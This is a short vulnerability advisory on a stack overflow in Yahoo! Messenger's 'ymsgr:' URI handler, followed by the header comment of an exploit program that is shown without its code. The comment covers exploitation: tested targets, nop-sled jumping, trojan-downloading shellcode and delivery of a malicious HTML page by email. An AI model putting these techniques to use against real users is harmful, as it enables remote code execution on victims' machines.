Yahoo! Messenger configures the 'ymsgr:' URI handler when it is installed. The handler invokes YPAGER.EXE with the supplied parameters. YPAGER.EXE accepts the 'call' argument; it is used for starting the 'Call Center' feature.

There is a stack overrun condition in the 'Call Center' component that may be exploited through a specially constructed URI. It has been reported that the stack frame of the affected function will be corrupted if the argument to the 'call' parameter passed to YPAGER.EXE is of 268 bytes or greater in length.

Attackers may exploit this vulnerability to execute arbitrary code.

/* Yahpoo.c by bob@dtors.net  [www.dtors.net] [DSR]
 *
 * Why Yahoo Messenger have not fixed this vulnerbility
 * I dont know...but either way they are stupid!
 *
 * This exploit has been tested on:
 * Yahoo Messenger 5,5,0,1246
 * Yahoo Module 5,5,0,454
 *
 * For:
 * Windows 2000 Professional 5.0.2195 SP3
 *
 * Rave@dtors.net has released a windows [exe] version of this
 * exploit but for Windows XP Pro SP1.
 * So both targets are vulnerable XP/2k...some addresses might need changing.
 *
 * Problems that may occur:
 *
 * The addresses used may vary from box to box..so they might need changing.
 * The stack may keep on changing the location of your shellcode address..you
 * need to hit a static sector that will not alternate. [this is the reason we jmp]
 * There exist two crashes...the first one we bypass..this is the access violation
 * when you hit the nop sled the first time round. The second crash is where we
 * hit the nop sled...so dont get confused between the 2.
 *
 * The shellcode used here...will not do anything malicious..just opens a popup box
 * You can change this shellcode to something else...but the buffer is not very big
 * so there is no chance of a bind shell or anything.
 * Sloth from nopninjas.com has a shellcode that will download a trojan
 * and execute it. Nice and small as well ;)
 *
 * Thats about it...this exploit will lead to remote command execution on the
 * victim. Bare in mind this is triggered via bad URI handling...and the victim
 * needs to actually view the evil html file..this can be done automatically via
 * email >:)
 *
 * Big Lovin to rica.
 * Thanks to rave for his time.
 * Greetz:
 * mercy, Redg, opy, phreez, eSDee, ilja, looney, The_itch, angelo, inv, kokanin,
 * macd, SiRVu|can, Sally, Lucipher, gloomy, phaze, uproot, b0f.
 * special thanks to sloth@nopninjas
